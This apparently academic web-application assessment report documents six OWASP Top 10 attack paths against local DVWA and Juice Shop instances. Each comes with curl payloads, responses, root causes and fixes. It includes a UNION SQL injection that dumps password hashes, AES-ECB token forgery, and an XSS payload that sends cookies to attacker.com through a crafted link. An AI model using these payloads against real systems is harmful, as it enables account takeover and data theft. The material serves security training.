# KAVACH — Workstream B
## B.3 Attack Path Documentation
### Web Application Security Assessment · Meridian FinServe Pvt. Ltd. (Fictional)

> **Engagement Context:** Meridian FinServe operates a customer-facing portal (lending applications, EMI servicing, statements) and a partner portal (merchant onboarding). A bug-bounty researcher disclosed at least one SQL-injectable endpoint and an IDOR on an account-statements path. This document records the attack path for each confirmed finding — payload, evidence, root cause, and business impact — as required by B.3.

---

## Finding Index

| ID | Vulnerability | OWASP | App | Severity |
|:---:|:---|:---:|:---:|:---:|
| [F-01](#f-01-broken-access-control--forged-review) | Broken Access Control (Forged Review) | A01:2021 | Juice Shop | 🟠 High |
| [F-02](#f-02-cryptographic-failures--xor--aes-ecb) | Cryptographic Failures (XOR + AES-ECB) | A02:2021 | DVWA | 🟠 High |
| [F-03a](#f-03a-injection--sql-injection) | SQL Injection | A03:2021 | DVWA | 🔴 Critical |
| [F-03b](#f-03b-injection--reflected-xss) | Reflected Cross-Site Scripting | A03:2021 | DVWA | 🟠 High |
| [F-04](#f-04-insecure-design--basketid-manipulation) | Insecure Design (BasketId Manipulation) | A04:2021 | Juice Shop | 🟡 Medium |
| [F-05](#f-05-identification--authentication-failures) | Auth Failures (Weak Credentials) | A07:2021 | Juice Shop | 🟠 High |

---

## F-01: Broken Access Control — Forged Review

**OWASP:** [A01:2021 — Broken Access Control](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A01%20Broken%20Access%20Control/A-01 Broken Access Control.md) · **Target:** OWASP Juice Shop · **Tool:** Burp Suite Community
**OWASP:** [A01:2021 — Broken Access Control](https://github.com/meghaInfosec/MKavach/blob/main/2.Webapp/B.2%20Findings/A01%20Broken%20Access%20Control/A-01%20Broken%20Access%20Control.md) · **Target:** OWASP Juice Shop · **Tool:** Burp Suite Community
---

### Attack Path

**Step 1 — Reconnaissance: Identify the review submission endpoint**

Log in as a normal user, navigate to any product page, and submit a review while Burp Suite proxy is active. Observe the outgoing request in HTTP History.

```
PUT /rest/products/1/reviews HTTP/1.1
Host: localhost:3000
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "message": "Great product!",
  "author": "attacker@example.com"
}
```

**Step 2 — Hypothesis: The `author` field is trusted from the client**

The response confirms the review is stored with the `author` value we supplied — the server never cross-checks this against the JWT identity.

**Step 3 — Exploitation: Forge a review as another user**

Send the same request to Burp Repeater. Change the `author` field to a victim email found in existing reviews.

```bash
# Exact payload used (curl equivalent)
curl -i -s -X PUT "http://localhost:3000/rest/products/1/reviews" \
  -H "Authorization: Bearer <attacker_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "message": "This product gave me food poisoning.",
    "author": "uvogin@juice-sh.op"
  }'
```

**Response (HTTP 200 — attack confirmed):**

```json
{
  "status": "success",
  "data": {
    "message": "This product gave me food poisoning.",
    "author": "uvogin@juice-sh.op"
  }
}
```

**Step 4 — Verification**

Refresh the product page. The forged review appears publicly under the victim's email address.

---

### Root Cause

The API endpoint `/rest/products/{id}/reviews` accepts the `author` field directly from the request body and writes it to the database without verifying it matches the authenticated user's identity in the JWT token. Authorization is absent at the data-write layer.

### Business Impact — Meridian FinServe

> An attacker could post fraudulent loan-repayment complaints, negative EMI service reviews, or false statements under any merchant's or borrower's identity on Meridian FinServe's partner portal — damaging trust, triggering regulatory scrutiny, and exposing the firm to defamation liability without a single compromised credential.

### Remediation

```diff
// webapp/routes/reviews.js
- const author = req.body.author;           // ❌ Trusts client input
+ const author = req.user.data.email;       // ✅ Derived from verified JWT
```

---

## F-02: Cryptographic Failures — XOR + AES-ECB

**OWASP:** [A02:2021 — Cryptographic Failures](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A02%20Cryptographic%20Failures/) · **Target:** DVWA · **Tool:** CyberChef, Python

---

### Attack Path — Level Low (XOR Cipher)

**Step 1 — Identify the scheme**

DVWA's Cryptography module presents a Base64-encoded intercepted ciphertext. Source code review (via "View Source") reveals:
- Algorithm: `base64_encode(XOR(plaintext, key))`
- Hardcoded key: `wachtwoord` (embedded in PHP source)

**Step 2 — Decrypt via the application itself**

```bash
curl -s -X POST "http://localhost:8082/vulnerabilities/cryptography/" \
  --cookie "PHPSESSID=<session_id>; security=low" \
  --data-urlencode "message=Lg4WGlQZChhSFBYSEB8bBQtPGxdNQSwEHREOAQY=" \
  --data-urlencode "direction=decode"
# Response body contains: "Your new password is: Olifant"
```

**Step 3 — Independent verification (Python)**

```python
import base64
key = "wachtwoord"
ciphertext = "Lg4WGlQZChhSFBYSEB8bBQtPGxdNQSwEHREOAQY="
decoded = base64.b64decode(ciphertext)
plaintext = "".join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(decoded))
print(plaintext)  # Output: Your new password is: Olifant
```

**Step 4 — Authenticate with recovered password**

```bash
curl -s -X POST "http://localhost:8082/vulnerabilities/cryptography/" \
  --cookie "PHPSESSID=<session_id>; security=low" \
  --data-urlencode "password=Olifant"
# Response: "Welcome back user" ✅
```

---

### Attack Path — Level Medium (AES-128-ECB Token Forgery)

**Step 1 — Identify target token**

Source code reveals AES-128-ECB encryption with hardcoded key `ik ben een aardbei` (truncated to 16 bytes: `ik ben een aardb`). Success condition: `sweep` user with `level == "admin"` and future expiry.

**Step 2 — Decrypt Sweep's token (CyberChef)**

```
Recipe: From Hex → AES Decrypt (ECB, key: "ik ben een aardb")
Input:  3061837c4f9debaf...
Output: {"user":"sweep","ex":1723620672,"level":"user","bio":"Squeeeeek"}
```

**Step 3 — Forge the token**

```json
{"user":"sweep","ex":9999999999,"level":"admin","bio":"Squeeeeek"}
```

**Step 4 — Re-encrypt and submit**

```
Recipe: AES Encrypt (ECB, key: "ik ben een aardb") → To Hex
Submit forged token → Response: "Welcome administrator Sweep" ✅
```

---

### Root Cause

Two compounding failures: (1) a custom, non-standard cryptographic algorithm (repeating-key XOR) that is trivially reversible, and (2) AES in ECB mode with a hardcoded key in source code — ECB encrypts identical plaintext blocks identically, enabling block-level manipulation without knowing the key, and a leaked source file instantly exposes the key to any attacker.

### Business Impact — Meridian FinServe

> An attacker who intercepts any encrypted credential or session token on Meridian FinServe's portal network segment could recover plaintext passwords and forge administrative session tokens within minutes using only a browser and CyberChef — granting full access to 180,000 borrower records and all merchant transaction data simultaneously.

### Remediation

```diff
- $key = "ik ben een aardbei";                          // ❌ Hardcoded
- openssl_decrypt($token, 'aes-128-ecb', $key);         // ❌ ECB mode

+ $key = getenv('APP_SECRET_KEY');                       // ✅ From secrets vault
+ openssl_decrypt($token, 'aes-256-gcm', $key, 0, $iv, $tag); // ✅ GCM with auth tag
```

---

## F-03a: Injection — SQL Injection

**OWASP:** [A03:2021 — Injection](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A03%20Injection/1.SQL%20Injection/1.SQL%20Injection.md) · **Target:** DVWA · **Tool:** curl, Burp Suite

---

### Attack Path

**Step 1 — Identify injectable parameter**

The DVWA User ID field constructs a SQL query via string concatenation. Submitting `1'` returns a database error, confirming unsanitised input reaches the SQL engine.

**Step 2 — Enumerate columns**

```bash
# Test column count with ORDER BY
curl -s "http://localhost:8082/vulnerabilities/sqli/?id=1' ORDER BY 2--+&Submit=Submit" \
  --cookie "PHPSESSID=<id>; security=low"
# No error = 2 columns confirmed
```

**Step 3 — Extract credentials (exact payload)**

```bash
curl -s "http://localhost:8082/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--+&Submit=Submit" \
  --cookie "PHPSESSID=<id>; security=low"
```

**Response — credentials dumped:**

```
ID: 1' UNION SELECT user,password FROM users--+
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99   ← MD5 hash of "password"

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
```

**Step 4 — Crack hashes offline**

MD5 hashes cracked instantly using hashcat or online rainbow tables — `admin:password` confirmed.

---

### Root Cause

The PHP source concatenates user input directly into the SQL string: `"SELECT * FROM users WHERE user_id = '$id'"` — no parameterisation, no escaping, no input validation at any layer.

### Business Impact — Meridian FinServe

> An attacker exploiting this on Meridian FinServe's account-statements endpoint (as flagged by the bug-bounty researcher) could dump the entire borrower database — 180,000 loan records, Aadhaar-linked identities, EMI histories, and merchant credentials — in a single automated query chain, constituting a critical RBI data-breach reportable event.

### Remediation

```diff
- $query = "SELECT * FROM users WHERE user_id = '$id'";   // ❌ Concatenation
- $result = mysqli_query($conn, $query);

+ $stmt = $conn->prepare("SELECT * FROM users WHERE user_id = ?");  // ✅ Prepared
+ $stmt->bind_param("s", $id);
+ $stmt->execute();
```

---

## F-03b: Injection — Reflected XSS

**OWASP:** [A03:2021 — Injection](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A03%20Injection/2.XSS_Reflected/1.Reflected_XSS.md) · **Target:** DVWA · **Tool:** Browser, curl

---

### Attack Path

**Step 1 — Identify reflection point**

The DVWA XSS (Reflected) page reflects the `name` parameter directly into the HTML response without sanitisation.

**Step 2 — Confirm execution**

```bash
curl -s "http://localhost:8082/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit" \
  --cookie "PHPSESSID=<id>; security=low"
# Response HTML contains: <script>alert(1)</script> — executed in browser ✅
```

**Step 3 — Session hijack payload (exact payload)**

```bash
curl -s "http://localhost:8082/vulnerabilities/xss_r/?name=<script>fetch('http://attacker.com/log?c='+document.cookie)</script>&Submit=Submit" \
  --cookie "PHPSESSID=<id>; security=low"
```

**Step 4 — Deliver via crafted link**

```
https://portal.meridianfinserve.in/account?name=<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
```

When a logged-in borrower clicks this link, their `PHPSESSID` is silently exfiltrated to the attacker's server.

---

### Root Cause

The PHP template echoes `$_GET['name']` directly into the HTML response: `echo "Hello " . $_GET['name'];` — no output encoding, no Content Security Policy header, no input sanitisation.

### Business Impact — Meridian FinServe

> An attacker could craft a phishing link targeting Meridian FinServe's 180,000 borrowers or 22,000 merchants — one click silently exfiltrates the victim's session cookie, enabling the attacker to take over their loan account, initiate EMI transfers, or access merchant reconciliation data without ever knowing the password.

### Remediation

```diff
- echo "Hello " . $_GET['name'];                                    // ❌ Raw output

+ echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); // ✅ Encoded
```

Additionally, add Content Security Policy header:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## F-04: Insecure Design — BasketId Manipulation

**OWASP:** [A04:2021 — Insecure Design](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A04%20Insecure%20Design/1.A04%20Insecure%20Design%20Findings.md) · **Target:** OWASP Juice Shop · **Tool:** Burp Suite Community

---

### Attack Path

**Step 1 — Intercept basket add request**

Log in as attacker, add any item to basket. Burp Suite captures the request:

```
POST /api/BasketItems/ HTTP/1.1
Host: localhost:3000
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"ProductId": 1, "BasketId": "2", "quantity": 1}
```

**Step 2 — Identify the vulnerability**

The `BasketId` is supplied by the client. There is no server-side check confirming that basket `2` belongs to the authenticated user.

**Step 3 — Exploitation: Manipulate another user's basket (exact payload)**

```bash
curl -i -s -X POST "http://localhost:3000/api/BasketItems/" \
  -H "Authorization: Bearer <attacker_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"ProductId": 1, "BasketId": "6", "quantity": 1}'
```

**Response (HTTP 200 — attack confirmed):**

```json
{
  "status": "success",
  "data": {
    "id": 12,
    "ProductId": 1,
    "BasketId": "6",
    "quantity": 1,
    "updatedAt": "2024-01-15T10:23:41.000Z"
  }
}
```

Basket `6` belongs to a different user. Item was added without their knowledge or consent.

---

### Root Cause

The API was architecturally designed to trust the `BasketId` value from the request body — a fundamental design flaw rather than a coding error. The server never derives which basket belongs to the requesting user from the session context; it simply executes whatever basket ID the client supplies.

### Business Impact — Meridian FinServe

> On Meridian FinServe's merchant portal, an equivalent design flaw in a loan-application or payment-cart endpoint would allow any authenticated merchant to modify another merchant's pending transaction basket — injecting fraudulent line items, altering loan amounts, or disrupting reconciliation workflows across all 22,000 merchant accounts.

### Remediation

```diff
// webapp/routes/basketItems.js
- const basketId = req.body.BasketId;          // ❌ Trusts client

+ // ✅ Derive basket from authenticated session — ignore client-supplied value
+ const authenticatedUserId = req.user.id;
+ const userBasket = await Basket.findOne({ where: { UserId: authenticatedUserId } });
+ const basketId = userBasket.id;
```

---

## F-05: Identification & Authentication Failures

**OWASP:** [A07:2021 — Identification & Auth Failures](https://github.com/dc15jan-ux/MKavach/blob/main/2.Webapp/B.2%20Findings/A07%20Identification%20and%20Authentication%20Failures/1.A07%20Identification%20and%20Authentication%20Failures%20Findings.md) · **Target:** OWASP Juice Shop · **Tool:** curl, Burp Suite Intruder

---

### Attack Path

**Step 1 — Identify the authentication endpoint**

```
POST /rest/user/login
Content-Type: application/json
```

No rate-limiting headers observed in responses (`X-RateLimit-*` absent). No CAPTCHA. No account lockout after repeated failures.

**Step 2 — Test with weak default credentials (exact payload)**

```bash
curl -i -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@admin.com", "password": "admin@1"}'
```

**Response (HTTP 200 — login succeeded on first attempt):**

```json
{
  "authentication": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AYWRtaW4uY29tIn19...",
    "bid": 1,
    "umail": "admin@admin.com"
  }
}
```

**Step 3 — Confirm no lockout exists**

Burp Suite Intruder was configured to send 50 sequential login attempts with incorrect passwords. All 50 returned HTTP 401 with no lockout, delay, or block — confirming the absence of brute-force protection.

**Step 4 — Use JWT to access admin functions**

```bash
curl -s "http://localhost:3000/rest/admin/application-configuration" \
  -H "Authorization: Bearer <token_from_step_2>"
# Returns full admin configuration — access confirmed ✅
```

---

### Root Cause

Two compounding failures: (1) the application permits the creation and use of trivially weak passwords (`admin@1`) with no complexity enforcement, and (2) the login endpoint `/rest/user/login` implements no rate-limiting, account lockout, or progressive delay — any IP can attempt unlimited credentials indefinitely without consequence.

### Business Impact — Meridian FinServe

> An automated credential-stuffing or brute-force attack against Meridian FinServe's customer portal login endpoint could compromise administrative accounts within hours — granting an attacker full access to 180,000 borrower records, EMI servicing controls, and merchant onboarding workflows, constituting both an RBI reportable breach and a PCI-DSS violation.

### Remediation

```diff
// webapp/routes/user.js
+ const rateLimit = require("express-rate-limit");
+ const loginLimiter = rateLimit({
+   windowMs: 15 * 60 * 1000,   // 15-minute window
+   max: 5,                      // Max 5 attempts per IP
+   message: { error: "Too many login attempts. Try again in 15 minutes." },
+   standardHeaders: true,
+   legacyHeaders: false,
+ });

  module.exports.login = function login() {
-   return (req, res, next) => {
+   return [loginLimiter, (req, res, next) => {
      // ... existing login logic
-   }
+   }];
  }
```

Additionally enforce password complexity at registration:
```javascript
// Minimum: 12 chars, 1 uppercase, 1 number, 1 special character
const passwordRegex = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;
```

---

## Summary of Attack Paths

| ID | Endpoint Attacked | Payload Type | Evidence Tool | Confirmed |
|:---:|:---|:---:|:---:|:---:|
| F-01 | `PUT /rest/products/{id}/reviews` | JSON body manipulation | Burp Repeater | ✅ |
| F-02 | DVWA Crypto module | XOR decode / AES-ECB forge | CyberChef + Python | ✅ |
| F-03a | `GET /vulnerabilities/sqli/` | UNION-based SQLi | curl | ✅ |
| F-03b | `GET /vulnerabilities/xss_r/` | `<script>` injection | curl + Browser | ✅ |
| F-04 | `POST /api/BasketItems/` | JSON body manipulation | Burp Repeater | ✅ |
| F-05 | `POST /rest/user/login` | Credential guessing | curl + Burp Intruder | ✅ |

---

> *All findings were demonstrated against self-hosted DVWA and OWASP Juice Shop running locally via Docker. No production systems, real credentials, or live Meridian FinServe infrastructure were accessed. All PII in this document is synthetic.*
>
> *Engagement: Project KAVACH · Workstream B · Futurense AI Clinic × IIT Roorkee*
